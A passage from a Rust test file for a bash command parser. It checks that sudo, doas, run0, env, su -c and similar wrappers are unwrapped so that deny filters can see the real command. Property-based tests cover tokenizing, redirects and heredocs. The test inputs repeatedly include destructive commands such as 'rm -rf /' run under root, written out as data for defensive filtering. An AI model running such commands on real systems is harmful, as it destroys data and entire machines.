            ("run0", &["-u", "root", "rm", "-rf", "/"]),
            ("run0", &["--user=root", "rm", "-rf", "/"]),
        ];
        for &(wrapper, args) in cases {
            let inner = unwrap_prefix_wrapper(&argv(wrapper, args))
                .unwrap_or_else(|| panic!("{wrapper} {args:?} should unwrap"));
            assert_eq!(inner, argv("rm", &["-rf", "/"]), "{wrapper} {args:?}");
        }
    }

    #[test]
    fn unwrap_prefix_wrapper_matches_full_path_head() {
        let inner = unwrap_prefix_wrapper(&argv("/usr/bin/sudo", &["rm", "-rf", "/"]))
            .expect("full-path sudo unwraps");
        assert_eq!(inner, argv("rm", &["-rf", "/"]));
        let inner = unwrap_prefix_wrapper(&argv("/usr/bin/env", &["curl", "https://x"]))
            .expect("full-path env unwraps");
        assert_eq!(inner, argv("curl", &["https://x"]));
    }

    #[test]
    fn unwrap_prefix_wrapper_strips_env_and_command() {
        // `env` / `command` are not privilege escalators but still hide
        // the real head; unwrapping surfaces it for the deny filters.
        let cases: &[(&str, &[&str], &str, &[&str])] = &[
            ("env", &["curl", "https://x"], "curl", &["https://x"]),
            ("command", &["bash"], "bash", &[]),
            ("env", &["rm", "-rf", "/"], "rm", &["-rf", "/"]),
            ("command", &["rm", "-rf", "/"], "rm", &["-rf", "/"]),
            // `command -v curl` is lookup-only, but the deny-safe
            // over-approximation still unwraps it to `curl`.
            ("command", &["-v", "curl"], "curl", &[]),
        ];
        for &(wrapper, args, head, rest) in cases {
            let inner = unwrap_prefix_wrapper(&argv(wrapper, args))
                .unwrap_or_else(|| panic!("{wrapper} {args:?} should unwrap"));
            assert_eq!(inner, argv(head, rest), "{wrapper} {args:?}");
        }
    }

    #[test]
    fn unwrap_prefix_wrapper_non_env_does_not_skip_inline_assignments() {
        // Only `env` may skip `KEY=VALUE` tokens; other wrappers treat
        // them as the command head.
        let inner = unwrap_prefix_wrapper(&argv("sudo", &["FOO=bar", "rm", "-rf", "/"]))
            .expect("sudo keeps FOO=bar as the inner head");
        assert_eq!(inner.head, "FOO=bar");
        assert_eq!(inner.args, vec!["rm", "-rf", "/"]);
    }

    #[test]
    fn unwrap_prefix_wrapper_unknown_long_flag_does_not_consume_next_token() {
        let inner = unwrap_prefix_wrapper(&argv("sudo", &["--version", "rm", "-rf", "/"]))
            .expect("unknown long flags must not eat the inner command");
        assert_eq!(inner, argv("rm", &["-rf", "/"]));
    }

    #[test]
    fn unwrap_prefix_wrapper_skips_env_assignments() {
        // `env` interposes inline `KEY=VALUE` assignments (and its own
        // value-taking flags) before the command head.
        let cases: &[(&str, &[&str])] = &[
            ("env", &["FOO=bar", "curl", "https://x"]),
            ("env", &["-i", "FOO=bar", "BAZ=1", "curl", "https://x"]),
            ("env", &["-u", "PATH", "curl", "https://x"]),
            ("env", &["--unset=PATH", "curl", "https://x"]),
            ("env", &["-C", "/tmp", "curl", "https://x"]),
        ];
        for &(wrapper, args) in cases {
            let inner = unwrap_prefix_wrapper(&argv(wrapper, args))
                .unwrap_or_else(|| panic!("{wrapper} {args:?} should unwrap"));
            assert_eq!(inner, argv("curl", &["https://x"]), "{wrapper} {args:?}");
        }
    }

    #[test]
    fn unwrap_prefix_wrapper_env_alone_returns_none() {
        // No command after the wrapper (assignments/flags only) yields None.
        assert_eq!(unwrap_prefix_wrapper(&argv("env", &[])), None);
        assert_eq!(unwrap_prefix_wrapper(&argv("command", &[])), None);
        assert_eq!(unwrap_prefix_wrapper(&argv("env", &["FOO=bar"])), None);
        assert_eq!(unwrap_prefix_wrapper(&argv("env", &["-i"])), None);
    }

    #[test]
    fn unwrap_prefix_wrapper_honours_double_dash() {
        let inner = unwrap_prefix_wrapper(&argv("sudo", &["--", "rm", "-rf", "/"]))
            .expect("-- separator unwraps");
        assert_eq!(inner, argv("rm", &["-rf", "/"]));
    }

    #[test]
    fn unwrap_prefix_wrapper_returns_none_for_non_wrapper() {
        assert_eq!(unwrap_prefix_wrapper(&argv("rm", &["-rf", "/"])), None);
        // `su` is not a prefix wrapper — its payload is handled via `-c`.
        assert_eq!(
            unwrap_prefix_wrapper(&argv("su", &["-c", "rm -rf /"])),
            None
        );
    }

    #[test]
    fn unwrap_prefix_wrapper_returns_none_when_only_flags() {
        assert_eq!(unwrap_prefix_wrapper(&argv("sudo", &["-u", "root"])), None);
    }

    #[test]
    fn extract_su_command_pulls_dash_c_payload() {
        let cases: &[&[&str]] = &[
            &["-c", "rm -rf /"],
            &["-lc", "rm -rf /"],
            &["root", "-c", "rm -rf /"],
            &["--command", "rm -rf /"],
        ];
        for &args in cases {
            let payload = extract_su_command(&argv("su", args))
                .unwrap_or_else(|| panic!("su {args:?} should carry a -c payload"));
            assert_eq!(payload, "rm -rf /");
        }
        let eq = extract_su_command(&argv("su", &["--command=rm -rf /"]))
            .expect("--command= inline form");
        assert_eq!(eq, "rm -rf /");
    }

    #[test]
    fn extract_su_command_returns_none_without_dash_c() {
        assert_eq!(extract_su_command(&argv("su", &["root"])), None);
        // A non-`su` head is left to `extract_shell_dash_c`.
        assert_eq!(extract_su_command(&argv("sudo", &["-c", "x"])), None);
    }

    #[test]
    fn parses_su_dash_c_inner_command() {
        let b = parse("su -c 'rm -rf /'");
        let inner = &b.segments[0].commands[0].inner_argv;
        assert_eq!(inner.len(), 1);
        assert_eq!(inner[0], argv("rm", &["-rf", "/"]));
        let heads: Vec<_> = b.commands().into_iter().map(|a| a.head.as_str()).collect();
        assert!(heads.contains(&"rm"), "got heads: {heads:?}");
    }

    #[test]
    fn parses_su_username_dash_c_inner_command() {
        let b = parse("su root -c 'rm -rf /'");
        let inner = &b.segments[0].commands[0].inner_argv;
        assert_eq!(inner.len(), 1);
        assert_eq!(inner[0], argv("rm", &["-rf", "/"]));
    }

    #[test]
    fn unwraps_multi_level_prefix_wrappers() {
        let b = parse("sudo doas rm -rf /");
        let outer = &b.segments[0].commands[0];
        let layer1 = unwrap_prefix_wrapper(outer).expect("sudo unwraps");
        assert_eq!(layer1.head, "doas");
        let layer2 = unwrap_prefix_wrapper(&layer1).expect("doas unwraps");
        assert_eq!(layer2, argv("rm", &["-rf", "/"]));
    }

    /// The tokenizer materialises one [`Token`] per shell word, so the
    /// token vector — not the resulting [`Bash`] — dominates peak memory
    /// on pathological command lines (a 6 MB command line is ~1.3M
    /// tokens, so every inline byte costs ~1.3 MB of RSS). Boxing the
    /// almost-always-absent substitution bodies keeps `Token` at 40
    /// bytes; storing them as an inline `Vec<String>` made it 56.
    #[test]
    fn token_stays_small() {
        let size = size_of::<Token>();
        assert!(
            size <= 40,
            "Token grew to {size} bytes; the tokenizer allocates one per \
             shell word, so widening it scales peak memory by the word count",
        );
    }

    use crate::testing::proptest::{
        arbitrary_command, arbitrary_utf8_bytes, bash_command, bash_heredoc, bash_process_subst,
        bash_redirects, bash_wrapper_nested, combined_short_opts,
    };
    use proptest::collection::vec as pvec;
    use proptest::prelude::*;

    proptest! {
        // Adversarial: the parser must not panic, hang, or blow up memory
        // for any printable ASCII. (PBT discovered a real infinite-loop
        // bug here when fed a lone `&` — see `lone_ampersand_does_not_loop`.)
        #[test]
        fn pbt_parse_never_panics(s in arbitrary_command()) {
            let _ = parse(&s);
        }

        // Structured generator: the parser still succeeds and produces
        // at least one segment whenever the source has non-whitespace
        // content.
        #[test]
        fn pbt_structured_command_yields_segments(s in bash_command()) {
            let b = parse(&s);
            if s.chars().any(|c| !c.is_whitespace()) {
                prop_assert!(!b.segments.is_empty());
            }
        }

        // Whitespace-only input parses to an empty segment list.
        #[test]
        fn pbt_blank_input_has_no_segments(spaces in "[ \\t]{0,20}") {
            let b = parse(&spaces);
            prop_assert!(b.segments.is_empty());
        }

        // Single-quoted text protects shell separators: any printable
        // ASCII (without single quotes) wrapped in `'…'` becomes one
        // segment with one command.
        #[test]
        fn pbt_single_quotes_protect_separators(inner in "[ -&(-~]{0,30}") {
            // Exclude ' (0x27) from the inner so we don't terminate the quote.
            let cmd = format!("echo '{inner}'");
            let b = parse(&cmd);
            prop_assert_eq!(b.segments.len(), 1);
            prop_assert_eq!(b.segments[0].commands.len(), 1);
            prop_assert_eq!(&b.segments[0].commands[0].head, "echo");
        }

        // is_flag invariant lifted to user-facing semantics.
        #[test]
        fn pbt_flags_partition_args(args in pvec("[A-Za-z0-9_./-]{1,8}", 0..6)) {
            let cmd = format!("ls {}", args.join(" "));
            let b = parse(&cmd);
            if let Some(first) = b.segments.first().and_then(|p| p.commands.first()) {
                let flags: Vec<&str> = first.flags().collect();
                let positional: Vec<&str> = first.positional().collect();
                // Disjoint:
                for f in &flags {
                    prop_assert!(!positional.contains(f));
                }
                // Union spans every recorded arg:
                prop_assert_eq!(flags.len() + positional.len(), first.args.len());
            }
        }

        // Joining N safe heads with `|` produces one segment with N commands.
        #[test]
        fn pbt_pipe_produces_n_commands(heads in pvec("[a-z][a-z0-9]{0,5}", 1..4)) {
            let cmd = heads.join(" | ");
            let b = parse(&cmd);
            prop_assert_eq!(b.segments.len(), 1);
            prop_assert_eq!(b.segments[0].commands.len(), heads.len());
            for (i, h) in heads.iter().enumerate() {
                prop_assert_eq!(&b.segments[0].commands[i].head, h);
            }
        }

        // Joining N safe heads with `;` produces N segments.
        #[test]
        fn pbt_semicolon_produces_n_segments(heads in pvec("[a-z][a-z0-9]{0,5}", 1..4)) {
            let cmd = heads.join("; ");
            let b = parse(&cmd);
            prop_assert_eq!(b.segments.len(), heads.len());
            for (i, h) in heads.iter().enumerate() {
                prop_assert_eq!(&b.segments[i].commands[0].head, h);
            }
        }

        // Env assignments come before the head and are stripped from args.
        #[test]
        fn pbt_env_assignments_precede_head(
            keys in pvec("[A-Z_][A-Z0-9_]{0,6}", 0..3),
            vals in pvec("[a-zA-Z0-9]{1,6}", 0..3),
        ) {
            // Build matching K=V pairs, then a head + flag.
            let n = keys.len().min(vals.len());
            let mut prefix = String::new();
            for i in 0..n {
                prefix.push_str(&format!("{}={} ", keys[i], vals[i]));
            }
            let cmd = format!("{prefix}cmd --flag");
            let b = parse(&cmd);
            prop_assert_eq!(b.segments.len(), 1);
            let argv = &b.segments[0].commands[0];
            prop_assert_eq!(&argv.head, "cmd");
            prop_assert_eq!(argv.env_assignments.len(), n);
            for i in 0..n {
                prop_assert_eq!(&argv.env_assignments[i].key, &keys[i]);
                prop_assert_eq!(&argv.env_assignments[i].value, &vals[i]);
            }
        }

        // testing.md L46: redirect operators are surfaced into
        // `Pipeline.redirects` and `Bash::has_redirect`. The generated
        // op count must equal the parsed redirect count, and each
        // emitted op must map to the matching `RedirectOp` variant.
        #[test]
        fn pbt_redirect_operators_surface_to_pipeline(
            (cmd, ops) in bash_redirects()
        ) {
            let b = parse(&cmd);
            prop_assert!(b.has_redirect);
            prop_assert_eq!(b.segments.len(), 1);
            let redirects = &b.segments[0].redirects;
            prop_assert_eq!(redirects.len(), ops.len());
            for (i, raw) in ops.iter().enumerate() {
                let expected = match *raw {
                    ">" => RedirectOp::Stdout,
                    ">>" => RedirectOp::StdoutAppend,
                    "<" => RedirectOp::Stdin,
                    "2>" => RedirectOp::Stderr,
                    "&>" => RedirectOp::Merge,
                    other => panic!("unexpected raw op {other:?}"),
                };
                prop_assert_eq!(redirects[i].op, expected);
            }
        }

        // testing.md L48-49: heredoc body lives inside a single
        // `Redirect` with op `Heredoc`. No body line may equal the
        // terminator (after stripping leading tabs for `<<-TAG`) — that
        // would mean the parser failed to close the heredoc. Substring
        // matches like `EOFa` are legitimate body content and must not
        // trigger this assertion.
        #[test]
        fn pbt_heredoc_body_is_one_redirect((cmd, tag) in bash_heredoc()) {
            let b = parse(&cmd);
            prop_assert!(b.has_heredoc);
            prop_assert!(b.has_redirect);
            let heredocs: Vec<&Redirect> = b
                .segments
                .iter()
                .flat_map(|p| p.redirects.iter())
                .filter(|r| matches!(r.op, RedirectOp::Heredoc))
                .collect();
            prop_assert!(!heredocs.is_empty());
            for r in heredocs {
                prop_assert!(
                    !r.target
                        .lines()
                        .any(|l| l.trim_start_matches('\t') == tag),
                    "heredoc body contains a line matching terminator {tag:?}: {:?}",
                    r.target
                );
            }
        }

        // testing.md L50-51: `<(...)` / `>(...)` are paren-balanced and
        // surface as `Bash::has_process_substitution`.
        #[test]
        fn pbt_process_substitution_is_flagged(cmd in bash_process_subst()) {
            let b = parse(&cmd);
            prop_assert!(b.has_process_substitution);
        }

        // testing.md L52: `bash -lc`, `sh -ec`, etc. — combined short
        // options still expose the wrapped command body. The wrapper
        // inspector folds the body into either `inner_argv` (when the
        // body parses) or `inner_code` (always preserved verbatim).
        #[test]
        fn pbt_combined_short_opts_surface_inner_payload(
            cmd in combined_short_opts()
        ) {
            let b = parse(&cmd);
            let outer_opt = b
                .segments
                .first()
                .and_then(|p| p.commands.first());
            prop_assert!(outer_opt.is_some(), "wrapper command did not parse: {cmd}");
            let outer = outer_opt.expect("Some after prop_assert");
            prop_assert!(
                !outer.inner_code.is_empty() || !outer.inner_argv.is_empty(),
                "combined short option failed to surface payload: {:?}",
                outer
            );
        }

        // testing.md L53-54: wrapper unrolling is bounded — even when
        // the source nests `bash -c` deeper than the budget, the parser
        // must terminate and the surfaced `inner_argv` chain must not
        // exceed the static `NESTING_BUDGET` (see `parse(...)` in this file).
        #[test]
        fn pbt_inner_argv_chain_is_bounded(cmd in bash_wrapper_nested(4)) {
            let b = parse(&cmd);
            for pipe in &b.segments {
                for argv in &pipe.commands {
                    let chain = deepest_inner_chain(argv);
                    prop_assert!(
                        chain <= NESTING_BUDGET,
                        "inner_argv chain {chain} exceeded nesting_budget={NESTING_BUDGET}",
                    );
                }
            }
        }

        // testing.md L55-56: tokenizer makes forward progress on every
        // step (`debug_assert!(advanced > 0)`). Surface the same
        // invariant at the public API: even on adversarial byte input
        // (lossy-decoded into a String), `parse` must terminate without
        // panicking. proptest's per-case deadline catches stalls.
        #[test]
        fn pbt_parse_terminates_on_arbitrary_bytes(bytes in arbitrary_utf8_bytes()) {
            let s = String::from_utf8_lossy(&bytes).into_owned();
            let _ = parse(&s);
        }
    }
}
